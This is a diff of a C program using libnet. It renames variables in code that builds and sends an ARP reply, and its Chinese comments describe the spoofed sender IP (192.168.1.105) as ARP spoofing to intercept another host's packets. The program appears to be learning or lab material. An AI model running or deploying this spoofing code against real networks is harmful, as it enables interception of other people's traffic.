@@ -42,19 +42,19 @@ int main(){
 	uint8_t padding[18]={0},init_mac[6]={0},cheat_ip[4]={192,168,1,105};
 	//arp欺骗：将源ip换成要拦截包的主机IP，这里以192.168.1.105为例
 	
-	libnet_ptag_t ptag ;
+	libnet_ptag_t arp_tag,eth_tag ;
 	//arp欺骗设置的ip
-	ptag = libnet_autobuild_arp(ARPOP_REPLY,(uint8_t*)&mac_addr->ether_addr_octet,cheat_ip,dst_mac,dst_ip,libnet_context);
+	arp_tag = libnet_autobuild_arp(ARPOP_REPLY,(uint8_t*)&mac_addr->ether_addr_octet,cheat_ip,dst_mac,dst_ip,libnet_context);
 	//正常发包设置的源ip地址
-	//ptag = libnet_autobuild_arp(ARPOP_REPLY,(uint8_t*)&mac_addr->ether_addr_octet,(uint8_t*)&src_ip,dst_mac,dst_ip,libnet_context);
-	//ptag = libnet_build_arp(ARPHRD_ETHER,ETHERTYPE_IP,6,4,ARPOP_REQUEST,(uint8_t*)&mac_addr->ether_addr_octet,(uint8_t*)&src_ip,init_mac,dst_ip,padding,sizeof(padding),libnet_context,0);
-	if(ptag == -1){
+	//arp_tag = libnet_autobuild_arp(ARPOP_REPLY,(uint8_t*)&mac_addr->ether_addr_octet,(uint8_t*)&src_ip,dst_mac,dst_ip,libnet_context);
+	//arp_tag = libnet_build_arp(ARPHRD_ETHER,ETHERTYPE_IP,6,4,ARPOP_REQUEST,(uint8_t*)&mac_addr->ether_addr_octet,(uint8_t*)&src_ip,init_mac,dst_ip,padding,sizeof(padding),libnet_context,0);
+	if(arp_tag == -1){
 		fprintf(stderr,"build arp error:%s\n",libnet_geterror(libnet_context));
 		goto close_resorce;
 	}
 	//组以太网头部
-	ptag = libnet_build_ethernet(dst_mac,(uint8_t*)&mac_addr->ether_addr_octet,ETHERTYPE_ARP,NULL,0,libnet_context,0);
-	if(ptag == -1){
+	eth_tag = libnet_build_ethernet(dst_mac,(uint8_t*)&mac_addr->ether_addr_octet,ETHERTYPE_ARP,NULL,0,libnet_context,0);
+	if(eth_tag == -1){
 		fprintf(stderr,"build ethernet frame error:%s\n",libnet_geterror(libnet_context));
 		goto close_resorce;
 	}
